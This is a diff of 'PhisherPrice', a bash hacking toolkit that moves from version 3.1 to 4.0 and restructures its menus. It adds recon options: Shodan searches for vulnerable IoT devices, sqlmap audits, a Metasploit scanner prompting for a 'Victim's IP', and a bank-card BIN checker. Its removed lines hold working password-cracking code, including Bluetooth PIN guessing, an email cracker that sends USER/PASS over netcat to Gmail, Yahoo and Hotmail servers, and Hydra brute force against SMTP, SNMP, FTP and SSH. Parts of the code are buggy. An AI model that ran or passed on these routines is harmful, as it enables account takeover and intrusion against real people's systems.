@@ -1,22 +1,19 @@
 #!/bin/bash
 ## rjwdlu4eva
-## PhiserPrice 3.1 (ALPHA)
-##
-## Greetz To m0nde from the NullSecurityTeam Family, thank-you for making me (SirCryptic) aware of my stupid mistake :)
-## NOTE TO SELF: DO NOT USE FIND AND REPLACE WITHOUT REVISING THE CODE AFTER!
+## PhiserPrice 4.0 (ALPHA)
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    echo "You Forgot To Say The Magic Word, bRuHhh cmon" 
    exit 1
 fi
-if [ -f /etc/bash_completion.d/readline ]; then
-    . /etc/bash_completion.d/readline
-fi
-
-i="0"
 clear
-while [ $i -lt 1 ]
-do
+echo -n "Loading Please Wait."
+
+# API keys and other variables
+phone_lookup_api_key=REPLACE_ME_WITH_YOUR_API_KEY
+bin_checker_api_key=REPLACE_ME_WITH_YOUR_API_KEY
+email_validator_api_key=REPLACE_ME_WITH_YOUR_API_KEY
+SHODAN_API_KEY=REPLACE_ME_WITH_YOUR_API_KEY
 
 HISTFILE="$HOME/.bash_history"
 history -a "$HISTFILE"
@@ -28,17 +25,15 @@ if [[ $- == *i* ]]; then
     bind '"\e[D": backward-char'
 fi
 history -r
-clear
-#API KEYS
-phone_lookup_api_key=REPLACE_ME_WITH_YOUR_API_KEY
-bin_checker_api_key=REPLACE_ME_WITH_YOUR_API_KEY
-email_validator_api_key=REPLACE_ME_WITH_YOUR_API_KEY
-SHODAN_API_KEY=REPLACE_ME_WITH_YOUR_API_KEY
+history -a
+history -w
 
-#COLOUR
+# Color and title
 red='\e[1;31m'
 yellow='\e[0;33m'
 Blue='\e[1;34m'
+title="PhisherPrice Alpha v4"
+echo -e '\033]2;'$title'\007'
 
 banner='
 \e[1;33m
@@ -48,14 +43,19 @@ banner='
   \_  /_/   /.
    \__/_   <   \e[1;31m PhisherPrice \e[1;33m
    /<<< \_\_ \e[1;31m Happy Hour Playset \e[1;33m
-  /,)^>>_._ \ \e[1;31m Version 3.1 Alpha \e[1;33m
+  /,)^>>_._ \ \e[1;31m Version 4.0 Alpha \e[1;33m
   (/   \\ /\\\
        // //```
 ======((`((====\e[1;34m'
 
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"
-	\e[0m\e[3;39m
+# Main menu function
+main_menu() {
+  while true
+  do
+    clear
+    echo -e "${banner}"
+    echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"
+    \e[0m\e[3;39m
 (1) Recon
 (2) Cracking
 (3) AutoxSploits
@@ -66,24 +66,149 @@ banner='
 (8) Start Th3inspector
 (u) Update Script
 (c) Contact Information
-CTRL + C To Exit
+
+Press q/Q To Exit
 '
-option1='1'
-option2='2'
-option3='3'
-option4='4'
-option5='5'
-option6='6'
-option7='7'
-option8='8'
-update='u'
-contact='c'
-
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"ToolSet$Blue]:"
-read -e -p" └─────► " x
-
-if [ "$x" == "$option1" ]; then                    #Option1
+read -r -p" └─────► " choice
+    case $choice in
+      1)
+        submenu1
+        ;;
+      2)
+        submenu2
+        ;;
+      3)
+        submenu3
+        ;;
+      4)
+        submenu4
+        ;;
+      5)
+        submenu5
+        ;;
+      6)
+        submenu6
+        ;;
+      7)
 clear
+echo "Are you sure you want to start SE Toolkit?"
+read -p "Press Y to confirm or any other key to cancel." confirm
+
+if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******  Starting Social Engineering Toolkit... ******"
+  echo -e "**************************************************\n"
+  
+  if sudo setoolkit; then
+    clear
+    echo -e "\n**************************************************"
+    echo "******          SET has been closed         ******"
+    echo -e "**************************************************\n"
+  else
+    clear
+    echo -e "\n**************************************************"
+    echo "******        Error running SET...         ******"
+    echo "******  Please check your installation.   ******"
+    echo -e "**************************************************\n"
+  fi
+
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Operation cancelled.         ******"
+  echo -e "**************************************************\n"
+fi
+        ;;
+      8)
+clear
+
+echo "Are you sure you want to start Th3inspector?"
+read -p "Press Y to confirm or any other key to cancel." confirm
+
+if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
+    clear
+    echo -e '\n**************************************************'
+    echo "******      Loading Th3inspector...     ******"
+    echo -e '**************************************************\n'
+
+    Th3inspector
+
+    clear
+    echo -e '\n**************************************************'
+    echo "******    Th3inspector has been closed.  ******"
+    echo -e '**************************************************\n'
+else
+    clear
+    echo -e '\n**************************************************'
+    echo "******         Operation cancelled.        ******"
+    echo -e '**************************************************\n'
+fi
+        ;;
+      u|U)
+    clear
+    echo "Updating Phisherprice..."
+    REPO_URL="https://github.com/sircryptic/phisherprice.git"
+    INSTALL_DIR="/usr/local/bin/phisherprice"
+
+    echo "Cloning latest release..."
+    git clone $REPO_URL $INSTALL_DIR.new || { echo "Failed to clone latest release"; exit 1; }
+
+    if [ -d $INSTALL_DIR.old ]; then
+        echo "Removing old version..."
+        sudo rm -rf $INSTALL_DIR.old || { echo "Failed to remove old version"; exit 1; }
+    fi
+
+    if [ -d $INSTALL_DIR ]; then
+        echo "Backing up current version..."
+        sudo mv $INSTALL_DIR $INSTALL_DIR.old || { echo "Failed to move current version to backup"; exit 1; }
+    fi
+
+    echo "Installing latest version..."
+    sudo mv $INSTALL_DIR.new $INSTALL_DIR || { echo "Failed to install latest version"; exit 1; }
+
+    echo "Making $INSTALL_DIR/phisherprice.sh executable..."
+    sudo chmod +x $INSTALL_DIR/phisherprice.sh || { echo "Failed to make phisherprice.sh executable"; exit 1; }
+
+    echo "Creating symbolic link for phisherprice.sh as pp..."
+    if [ -L /usr/local/bin/pp ]; then
+        echo "Removing old symbolic link..."
+        sudo rm /usr/local/bin/pp || { echo "Failed to remove old symbolic link"; exit 1; }
+    fi
+    sudo ln -s $INSTALL_DIR/phisherprice.sh /usr/local/bin/pp || { echo "Failed to create symbolic link"; exit 1; }
+
+    echo "Update complete!"
+
+    echo "Restarting Phisherprice (now accessible via 'pp')..."
+    sudo pp || { echo "Failed to restart Phisherprice"; exit 1; }
+        ;;
+      c|C)
+clear
+
+echo -e "\e[1;33m\nIf you have any issues, feel free to file a bug report on Git.\e[0m\n"
+echo -e "\e[1;34mI would personally like to thank \e[1;35mJack \e[1;34mover at \e[1;32mKali Hacking Community Discord Server\e[1;34m for being my motivation to keep making this tool. Sadly, this tool is no longer going to be updated much longer, and the original KHC community sank. Farewell to all those I personally knew.\nI would also like to thank \e[1;35mKiera<3 \e[1;34mover @KCH \e[1;34mfor making me aware of bugs. Without people like this, I probably would have been oblivious. So thank you once again to all those that made this possible and gave me inspiration.\n- \e[1;31mSirCryptic \e[1;34m\n"
+echo -e "Press Enter to continue."
+        ;;
+	q|Q)
+	clear
+	echo "Exiting PhisherPrice. Goodbye!"
+	exit 0
+  ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+
+# Submenu 1 function
+submenu1() {
+  while true
+  do
+	clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                   
     \e[0m\e[3;39m \e[1;31m
@@ -111,37 +236,17 @@ Recon & Auditing
 (20) BIN Checker
 (21) Email Validator
 (22) Scan Shodan for vulnrable IOT Devices
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
+
+Press q/Q To Exit
+Press b/B To Go To Back
 '
-sub2='1'
-sub3='2'
-sub4='3'
-sub5='4'
-sub6='5'
-sub7='6'
-sub8='7'
-sub9='8'
-sub10='9'
-sub11='10'
-sub12='11'
-sub13='12'
-sub14='13'
-sub15='14'
-sub16='15'
-sub17='16'
-sub18='17'
-sub19='18'
-sub20='19'
-sub21='20'
-sub22='21'
-sub23='22'
-
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Recon & Audit$Blue]:"
-read -e -p" └─────► " x
+read -r -p" └─────► " choice
 
-if [ "$x" == "$sub2" ]; then                    #Sub-Option-2
-clear
+
+    case $choice in
+        1)
+        clear
 echo "Enter website domain:"
 read -e domain
 history -a
@@ -168,10 +273,9 @@ else
     echo "Information saved to file: $domain.txt"
   fi
 fi
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub3" ]; then                    #Sub-Option-3
-clear
+        ;;
+        2)
+        clear
 echo -e '\e[1;33m
   ________             ._____________ 
  /  _____/  ____  ____ |   \______   \
@@ -199,11 +303,9 @@ else
   echo "-----------------------------"
   echo -e "$response"
 fi
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub4" ]; then                    #Sub-Option-4
-clear
+        ;;
+        3)
+        clear
 echo -e '\e[1;33m
 __________._____________  .____                  __                 
 \______   \   \______   \ |    |    ____   ____ |  | ____ ________  
@@ -231,9 +333,9 @@ else
   echo -e "$response"
 fi
 
-read -p "Press enter to continue."
-elif [ "$x" == "$sub5" ]; then                    #Sub-Option-5
-clear
+        ;;
+        4)
+        clear
 echo -e '\e[1;33m
 ________    _______    _________ .____                  __                 
 \______ \   \      \  /   _____/ |    |    ____   ____ |  | ____ ________  
@@ -260,10 +362,9 @@ else
   echo -e "$response"
 fi
 
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub6" ]; then                    #Sub-Option-6
-clear
+        ;;
+        5)
+        clear
 echo -e '\e[1;33m
 __________                                         ________    _______    _________
 \______   \ _______  __ ___________  ______ ____   \______ \   \      \  /   _____/
@@ -291,10 +392,9 @@ else
   echo -e "$response"
 fi
 
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub7" ]; then                    #Sub-Option-7
-clear
+        ;;
+        6)
+        clear
 echo -e '\e[1;33m
   _________.__                             .___ ________    _______    _________
  /   _____/|  |__ _____ _______   ____   __| _/ \______ \   \      \  /   _____/
@@ -328,11 +428,9 @@ else
     echo "Results saved to $filename"
   fi
 fi
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub8" ]; then                    #Sub-Option-8
-clear
+        ;;
+        7)
+        clear
 echo -e '\e[1;33m
  _______      _____      _____ __________    _________                     
  \      \    /     \    /  _  \\______   \  /   _____/ ____ _____    ____  
@@ -366,10 +464,9 @@ else
 '
   echo "$nmap_output"
 fi
-
-read
-elif [ "$x" == "$sub9" ]; then                    #sshscanner
-clear
+        ;;
+        8)
+        clear
 function scan_ciphers() {
   host="$1"
   port="$2"
@@ -403,7 +500,6 @@ echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  
 '
-  read -n 1 -s -r -p "Press any key to continue"
 }
 echo -e '
   _________ _________ ___ ___     _________                                         
@@ -420,8 +516,9 @@ echo -e "Enter port: "
 read -e port
 
 scan_ciphers "$host" "$port"
-elif [ "$x" == "$sub10" ]; then                    #Sub-Option-10
-clear
+        ;;
+        9)
+        clear
 echo "Enter the host you want to scan (e.g. testsite.com):"
 read -e host
 echo "Enter the host port you want to scan (e.g. 443):"
@@ -471,10 +568,9 @@ else
   echo "Scan complete."
 fi
 
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub11" ]; then                    #Sub-Option-11
-clear
+        ;;
+        10)
+        clear
 echo -e '\e[1;33m
   ___ ___________________________________  _________                     
  /   |   \__    ___/\__    ___/\______   \/   _____/ ____ _____    ____  
@@ -503,10 +599,9 @@ echo "-------------------------------"
   curl -sI $subop11
 fi
 
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub12" ]; then                    #Sub-Option-12
-clear
+        ;;
+        11)
+        clear
 echo -e '\e[1;33m
    _____    _________ _______    .____                  __                 
   /  _  \  /   _____/ \      \   |    |    ____   ____ |  | ____ ________  
@@ -539,11 +634,9 @@ echo -e "\n------------------------------"
 echo "Host scanned using PhiserPrice"
 echo "------------------------------"
 
-read -p "Press enter to continue."
-
-
-elif [ "$x" == "$sub13" ]; then                    #Sub-Option-13
-clear
+        ;;
+        12)
+        clear
 echo -e '\e[1;33m
 __________                                       ________            ___.    
 \______   \_____    ____   ____   ___________   /  _____/___________ \_ |__  
@@ -570,11 +663,9 @@ else
   echo "---------------------------"
   echo -e "$response"
 fi
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub14" ]; then                    #Sub-Option-14
-clear
+        ;;
+        13)
+        clear
 echo -e '\e[1;33m
 .____    .__        __       _________      .__  _____  _____             
 |    |   |__| ____ |  | __  /   _____/ ____ |__|/ ____\/ ____\___________ 
@@ -613,9 +704,9 @@ fi
 echo -e "\n-----------------------------"
 echo "Host links extraction completed using PhisherPrice!"
 echo "-----------------------------"
-
-elif [ "$x" == "$sub15" ]; then                    #Sub-Option-15
-clear
+        ;;
+        14)
+        clear
 echo -e '\e[1;33m
 __________.__                           .____                  __                 
 \______   \  |__   ____   ____   ____   |    |    ____   ____ |  | ____ ________  
@@ -639,10 +730,9 @@ curl --request GET "https://api.apilayer.com/number_verification/validate?number
 echo -e "\n-----------------------------"
 echo "Phone Info Found Using PhisherPrice"
 echo "-----------------------------"
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub16" ]; then                    #Sub-Option-16
-clear
+        ;;
+        15)
+        clear
 echo -e '\e[1;33m
 __________              _____                .__           __  .__               
 \______   \ _______  __/  _  \   ____ _____  |  | ___.__._/  |_|__| ____   ______
@@ -675,11 +765,9 @@ fi
 echo -e '\n----------------------------------'
 echo "Hosts/GA-ID retrieved using PhisherPrice"
 echo '----------------------------------'
-
-read -p "Press Enter to continue." 
-
-elif [ "$x" == "$sub17" ]; then                    #Sub-Option-17
-clear
+        ;;
+        16)
+        clear
 echo -e '\e[1;33m
  ____ ___                       _________                           .__     
 |    |   \______ ___________   /   _____/ ____ _____ _______   ____ |  |__  
@@ -715,10 +803,9 @@ if [[ $save_output =~ ^[Yy]$ ]]; then
   echo "Output saved to enum4linux_output.txt"
 fi
 
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub18" ]; then                    #Sub-Option-18
-clear
+        ;;
+        17)
+        clear
 echo -e '\e[1;33m
   _________________  .____         _____                                     
  /   _____/\_____  \ |    |       /     \ _____  ______ ______   ___________ 
@@ -762,10 +849,9 @@ else
   echo 'Failed to Conduct SQL Audit'
   echo '-------------------------------------------'
 fi
-  read -p "Press enter to continue."
-
-elif [ "$x" == "$sub19" ]; then                    #sub-Option-19
-clear
+        ;;
+        18)
+        clear
 echo -e '\e[1;33m
   _________________  .____     
  /   _____/\_____  \ |    |    
@@ -787,11 +873,9 @@ if [[ $output == *"available databases"* ]]; then
 else
   echo "No database information retrieved. Please check your input and try again."
 fi
-
-  read -p "Press enter to continue."
-
-elif [ "$x" == "$sub20" ]; then                    #sub-Option-20
-clear
+        ;;
+        19)
+        clear
 echo -e '\e[1;33mMSPLOIT VULN SCANNER\e[0m'
 echo -e "\n-------------------------------------------"
 echo -e "\e[1;36mEnter Victim's IP:\e[0m"
@@ -828,10 +912,9 @@ else
   echo -e "\n\e[1;32m-------------------------------------------\e[0m"
 fi
 
-read -p "Press enter to continue."
-
-elif [ "$x" == "$sub21" ]; then                    #sub-Option-21
-clear
+        ;;
+        20)
+        clear
 echo -e '\e[1;33m
 BIN Checker \e[1;34m
 '
@@ -843,12 +926,9 @@ curl --request GET \
     --header "X-RapidAPI-Host: bank-card-bin-num-check.p.rapidapi.com" \
     --header "X-RapidAPI-Key:$bin_checker_api_key"
 echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-elif [ "$x" == "$sub22" ]; then                    #sub-Option-22
-clear
+        ;;
+        21)
+        clear
 echo -e '\e[1;33m
 Email Validator \e[1;34m
 '
@@ -859,12 +939,9 @@ read -e email
 curl --location --request GET "https://api.apilayer.com/email_verification/${email}" \
 --header "apikey: ${email_validator_api_key}"
 echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-elif [ "$x" == "$sub23" ]; then                    #Sub-Option-2
-clear
+        ;;
+        22)
+        clear
 echo "Shodan Vulnrability Search${reset}"
 
 OUTPUT_FILE="shodan_results_$(date +%Y%m%d_%H%M%S).txt"
@@ -931,7 +1008,7 @@ QUERIES+=("product:\"neo4j\" port:7474")
 
 read -p "Do you want to start the search? (y/n) " answer
 if [ "$answer" != "y" ]; then
-    exit
+    return
 fi
 for QUERY in "${QUERIES[@]}"
 do
@@ -940,15 +1017,28 @@ do
 done    
 echo ""
 echo "Scanning finished saved to $OUTPUT_FILE"
-read
-
-else 
-
-n
-
-fi
-
-elif [ "$x" == "$option2" ]; then                          #Option2
+echo ' '
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+  ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+# Submenu 2 function
+submenu2() {
+  while true
+  do
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
@@ -966,669 +1056,21 @@ Cracking / Brute Force
 (9) Wifi Honey Pot Cracker
 (10) Just Dump It
 
-CTRL + C To Exit
-
-Press ENTER To Go To Main Menu
+Press q/Q To Exit
+Press b/B To Go To Back
 '
-bluetoothc='1'
-subf='2'
-subg='3'
-john2='4'
-subh='5'
-subi='6'
-subj='7'
-subk='8'
-honeywhy='9'
-dumpitall='10'
-
-
-wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Cracking/Brute$Blue]:"
-read -e -p" └─────► " x
-
-if [ "$x" == "$bluetoothc" ]; then                    #blueooth
-clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
-                   
-\e[0m\e[3;39m \e[1;31m
-Bluetooth Toolkit
-\e[3;39m
-(1) Bluetooth device scanner
-(2) Bluetooth PIN Code Cracker
-
-CTRL + C To Exit
-
-Press ENTER To Go To Main Menu
-'
-bscan='1'
-bcrack='2'
-
-echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Bluetooth-Toolkit$Blue]:"
-read -e -p" └─────► " x
-
-if [ "$x" == "$bscan" ]; then                    #bscan
-echo -e "\nBluetooth device scanner"
-echo -e "-------------------------------------------\n"
-
-echo "Scanning for nearby devices..."
-devices=$(hcitool scan | grep -oP '^\S+\s+\K.*')
-
-if [ -z "$devices" ]; then
-  echo -e "\nNo devices found."
-  read
-fi
-
-echo -e "\n-------------------------------------------"
-echo "Nearby devices:"
-echo -e "-------------------------------------------\n"
-
-echo "$devices"
-
-echo -e "\n-------------------------------------------"
-echo -e "Enter the MAC address of the device to connect: "
-read -e mac_address
-
-echo "Connecting to $mac_address..."
-rfcomm connect /dev/rfcomm0 "$mac_address" 1 &
-sleep 1
-
-if [[ $(echo $?) -ne 0 ]]; then
-  echo -e "\nFailed to connect to $mac_address."
-  read
-fi
-
-echo -e "\nSuccessfully connected to $mac_address."
-
-elif [ "$x" == "$bcrack" ]; then                    #bcrack
-clear
-echo -e "\e[1;33mBluetooth PIN Code Cracking Script.\e[0m"
-echo -e "\n-------------------------------------------"
-
-echo -n "Enter the MAC address of the target device: "
-read -e mac_address
-echo -n "Enter the name of the PIN code file: "
-read -e pin_file
-
-clear
-echo -e "\n-------------------------------------------"
-echo -e "\e[1;34mCracking Bluetooth PIN code...\e[0m"
-echo -e "-------------------------------------------\n"
-
-while read pin; do
-  echo "Trying PIN code: $pin"
-  rfcomm connect hci0 "$mac_address" "$pin" 1>/dev/null 2>&1
-  
-  if [[ $? -eq 0 ]]; then
-    echo -e "\n-------------------------------------------"
-    echo -e "\e[1;32mPIN code found!\e[0m"
-    echo -e "-------------------------------------------"
-    echo -e "PIN code: $pin"
-    read -p "Press Enter to continue."
-    break
-  fi
-  
-done < "$pin_file"
-
-echo -e "\n-------------------------------------------"
-echo -e "\e[1;31mPIN code not found.\e[0m"
-echo -e "-------------------------------------------"
-read -p "Press Enter to continue."
-
-else
-n
-fi
-
-elif [ "$x" == "$subf" ]; then                    #Sub-Option-f
-clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
-                   
-\e[0m\e[3;39m \e[1;31m
-Hydra Brute Force
-\e[3;39m
-(1) Email Crack (SMTP)
-(2) SNMP Brute Force
-(3) FTP Brute Force
-(4) SSH  Brute Force
-(5) SSH  Brute Force (port 22)
-(6) POP3 Brute Force
-(7) HTTP 401 Brute Force
-(8) Windows RDP Brute Force
-(9) SMB Brute Force
-(10) WP AUTO BRUTE
-
-CTRL + C To Exit
-
-Press ENTER To Go To Main Menu
-'
-nohydra='0'
-hynull1='1'
-hynull2='2'
-hynull3='3'
-hynull4='4'
-hynull5='5'
-hynull6='6'
-hynull7='7'
-hynull8='8'
-newoption1='9'
-HYDRAWPAUTOBRUTE='10'
-
-echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
-read -e -p" └─────► " x
-
-
-if [ "$x" == "$nohydra" ]; then                    #no hydra
-clear
-# Define SMTP options
-declare -A smtp_options=(
-  ["gmail"]="smtp.gmail.com:587"
-  ["yahoo"]="smtp.mail.yahoo.com:587"
-  ["hotmail"]="smtp.live.com:587"
-)
-
-# Define POP3 options
-declare -A pop3_options=(
-  ["gmail"]="pop.gmail.com:995"
-  ["yahoo"]="pop.mail.yahoo.com:995"
-  ["hotmail"]="outlook.office365.com:995"
-)
-
-# Define IMAP options
-declare -A imap_options=(
-  ["gmail"]="imap.gmail.com:993"
-  ["yahoo"]="imap.mail.yahoo.com:993"
-  ["hotmail"]="outlook.office365.com:993"
-)
-
-# Display banner
-echo -e '\e[1;33m
-   _____                       __    
-  / ___ \____________    ____ |  | __
- / / ._\ \_  __ \__  \ _/ ___\|  |/ /
-<  \_____/|  | \// __ \\  \___|    < 
- \_____\  |__|  (____  /\___  >__|_ \
-                     \/     \/     \/\e[1;34m
-'
-echo -e "\e[1;33mSimple Email Cracking Script.\e[0m"
-echo -e "\n-------------------------------------------"
-
-# Select email service
-echo "Choose an email service:"
-echo "SMTP:"
-for service in "${!smtp_options[@]}"; do
-  echo "[$service] ${smtp_options[$service]}"
-done
-echo "POP3:"
-for service in "${!pop3_options[@]}"; do
-  echo "[$service] ${pop3_options[$service]}"
-done
-echo "IMAP:"
-for service in "${!imap_options[@]}"; do
-  echo "[$service] ${imap_options[$service]}"
-done
-
-read -e "Email service: " email_service
-
-# Select protocol and port based on the email service chosen
-case $email_service in
-  "gmail")
-    smtp="${smtp_options[$email_service]}"
-    pop3="${pop3_options[$email_service]}"
-    imap="${imap_options[$email_service]}"
-    ;;
-  "yahoo")
-    smtp="${smtp_options[$email_service]}"
-    pop3="${pop3_options[$email_service]}"
-    imap="${imap_options[$email_service]}"
-    ;;
-  "hotmail")
-    smtp="${smtp_options[$email_service]}"
-    pop3="${pop3_options[$email_service]}"
-    imap="${imap_options[$email_service]}"
-    ;;
-  *)
-    echo "Invalid email service"
-    read
-    ;;
-esac
-
-# Get email address and password file path
-echo -n "Enter email address: "
-read -e email
-echo -n "Enter password file path: "
-read -e password_file
-
-# Select protocol and port
-echo -n "Enter protocol (smtp/pop3/imap): "
-read -e protocol
-echo -n "Enter port number: "
-read -e port
-
-echo -e "\n-------------------------------------------"
-echo -e "\e[1;34mCracking email password...\e[0m"
-echo -e "-------------------------------------------"
-while read password; do
-  case $protocol in
-    "smtp")
-      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$smtp_host" "$port")
-      ;;
-    "pop3")
-      pop_host=$(echo "$pop" | cut -d: -f1)
-      pop_port=$(echo "$pop" | cut -d: -f2)
-      response=$(echo "USER $email" && echo "PASS $password" && echo "QUIT" | nc -w 10 "$pop_host" "$pop_port")
-      ;;
-    "imap")
-      imap_host=$(echo "$imap" | cut -d: -f1)
-      imap_port=$(echo "$imap" | cut -d: -f2)
-      response=$(echo "a login $email $password" && echo "b select inbox" && echo "c logout" | nc -w 10 "$imap_host" "$imap_port")
-      ;;
-    *)
-      echo -e "\n-------------------------------------------"
-      echo -e "\e[1;31mInvalid protocol.\e[0m"
-      echo -e "-------------------------------------------"
-      read
-      read
-  esac
-  
-  if [[ "$response" == *"+OK"* ]]; then
-    echo -e "\n-------------------------------------------"
-    echo -e "\e[1;32mPassword found!\e[0m"
-    echo -e "-------------------------------------------"
-    echo -e "Email: $email"
-    echo -e "Password: $password"
-    read
-  fi
-done < "$password_file"
-
-read
-
-
-elif [ "$x" == "$hynull1" ]; then                    #hynull-Option-1
-clear
-echo -e '\e[1;33m
-   _____                       __    
-  / ___ \____________    ____ |  | __
- / / ._\ \_  __ \__  \ _/ ___\|  |/ /
-<  \_____/|  | \// __ \\  \___|    < 
- \_____\  |__|  (____  /\___  >__|_ \
-                     \/     \/     \/\e[1;34m
-'
-echo -e "\e[1;33mSimple Email Cracking Script Using Hydra.\e[0m"
-echo -e "\n-------------------------------------------"
-
-echo -n "Choose a SMTP service (Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com): "
-read -e smtp
-
-echo -n "Enter Email Address: "
-read -e email
-
-echo -n "Provide Directory of Wordlist for Passwords: "
-read -e wordlist
-
-echo -n "Enter SMTP Port Number (default is 465): "
-read -e port
-port=${port:-465}  # set default port number if no input is provided
-
-echo -e "\n-------------------------------------------"
-echo -e "\e[1;34mCracking email password...\e[0m"
-echo -e "-------------------------------------------"
-output=$(hydra -S -l "$email" -P "$wordlist" -e ns -V -s "$port" "$smtp" smtp 2>&1)
-
-if [[ $? -ne 0 ]]; then
-  echo -e "\e[1;31mAn error occurred while running Hydra. Please check your input and try again.\e[0m"
-  exit 1
-fi
-
-echo -e "\n-------------------------------------------"
-echo -e "\e[1;32mHydra output:\e[0m"
-echo -e "-------------------------------------------"
-echo -e "$output"
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$hynull2" ]; then                    #hynull-Option-2
-clear
-echo -e '\e[1;33m
-  _________ _______      _____ __________ 
- /   _____/ \      \    /     \\______   \
- \_____  \  /   |   \  /  \ /  \|     ___/
- /        \/    |    \/    Y    \    |    
-/_______  /\____|__  /\____|__  /____|    
-        \/         \/         \/ Brute Force \e[1;34m
-'
-echo "Simple SNMP Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter the path of the password list:"
-read -e hydrasnmppass
-echo "Enter The Host IP Address of SNMP Server:"
-read -e hydraip
-
-echo -e "\n-----------------------------"
-echo "Attempting SNMP password cracking..."
-echo "-----------------------------"
-output=$(hydra -P $hydrasnmppass -v $hydraip snmp 2>&1)
-
-if echo "$output" | grep -q "login:\|password:"; then
-  echo -e "\n-------------------------------------------"
-  echo "SNMP password cracked successfully!"
-  echo -e "-------------------------------------------"
-  echo "Cracked password:"
-  echo "$output"
-else
-  clear
-  echo -e "\n-------------------------------------------"
-  echo "Failed to crack SNMP password."
-  echo -e "-------------------------------------------"
-fi
-
-read -p "Press enter to continue." 
-
-elif [ "$x" == "$hynull3" ]; then                    #hynull-Option-3
-clear
-echo -e '\e[1;33m
-________________________________ 
-\_   _____/\__    ___/\______   \
- |    __)    |    |    |     ___/
- |     \     |    |    |    |    
- \___  /     |____|    |____|    
-     \/ Brute Force\e[1;34m
-'
-echo "FTP Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter Known User:"
-read -e hydrauser
-echo "Enter Password List Location:"
-read -e hydrapasslist
-echo "Enter the IP Address:"
-read -e hydraip
-
-echo -e "\n-------------------------------------------"
-echo "Running hydra..."
-output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo -e "-------------------------------------------"
-else
-  echo -e "\n-------------------------------------------"
-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-
-read -p "Press enter to continue."
-elif [ "$x" == "$hynull4" ]; then                    #hynull-Option-4
-clear
-echo -e '\e[1;33m
-  _________ _________ ___ ___  
- /   _____//   _____//   |   \ 
- \_____  \ \_____  \/    ~    \
- /        \/        \    Y    /
-/_______  /_______  /\___|_  / 
-        \/        \/       \/ Brute Force \e[1;34m
-'
-echo "SSH Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter User List Location:"
-read -e hydrauser2
-echo "Enter Password List Location:"
-read -e hydrapasslist2
-echo "Enter IP Address:"
-read -e hydraip2
-
-echo -e "\n-------------------------------------------"
-echo "Running hydra..."
-output=$(hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  password=$(echo "$output" | grep "login:" | awk '{print $NF}')
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo "Password: $password"
-  echo -e "-------------------------------------------"
-else
-  echo -e "\n-------------------------------------------"
-  echo "Login Failed"
-  echo -e "-------------------------------------------"
-fi
-
-read -p "Press enter to continue."
-
-elif [ "$x" == "$hynull5" ]; then                    #hynull-Option-5
-clear
-echo -e "\nFTP Password Cracking Script Using Hydra"
-echo -e "\n-------------------------------------------"
-echo "Enter Known User:"
-read -e hydrauser
-echo "Enter Password List Location:"
-read -e hydrapasslist
-echo "Enter the IP Address:"
-read -e hydraip
-
-echo -e "\n-------------------------------------------"
-echo "Running hydra..."
-output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
-
-if echo "$output" | grep -q "1 valid password found"; then
-  echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo -e "-------------------------------------------"
-else
-  echo -e "\n-------------------------------------------"
